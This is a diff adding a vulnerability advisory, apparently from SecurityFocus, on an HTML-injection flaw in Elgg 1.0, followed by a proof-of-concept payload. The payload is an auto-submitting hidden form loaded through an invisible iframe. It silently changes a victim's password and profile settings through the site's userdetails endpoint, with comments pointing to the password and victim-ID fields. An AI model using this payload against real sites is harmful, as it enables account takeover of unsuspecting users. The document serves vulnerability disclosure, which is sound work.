@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/43871/info
+
+Elgg is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Exploits require the attacker be an authenticated user; this permission may be trivial to acquire.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Elgg 1.0 is vulnerable; other versions may also be affected. 
+
+<body onload="document.forms.g.submit();"> <iframe name="my_frame" ALING="BOTTOM" scrolling=no width=1 heigth=1></iframe> <form method="POST" target="my_frame" action="http://www.example.com/_userdetails/index.php" name="g" id="g"> <input type=hidden name="name" value=""> <input type=hidden name="email" value=""> <input type=hidden name="moderation" value="no"> <input type=hidden name="publiccoments" value="no"> <input type=hidden name="receivenotifications" value="no"> <input type=hidden name="password1" value="password"> <------ Eye with this <input type=hidden name="password2" value="password"> <------ Eye with this <input type=hidden name="flag[commentwall_access]" value="LOGGED_IN"> <input type=hidden name="lang" value=""> <input type=hidden name="flag[sidebarsidebar-profile]" value="yes"> <input type=hidden name="flag[sidebarsidebar-communities]" value="yes"> <input type=hidden name="flag[sidebarsidebar-blog]" value="yes"> <input type=hidden name="flag[sidebarsidebar-friends]" value="yes"> <input type=hidden name="visualeditor" value="yes"> <input type=hidden name="action" value="userdetails:update"> <input type=hidden name="id" value="id_victima"> <---------Eye with this <input type=hidden name="profile_id" value="id_victima"> <---------Eye with this </form> 
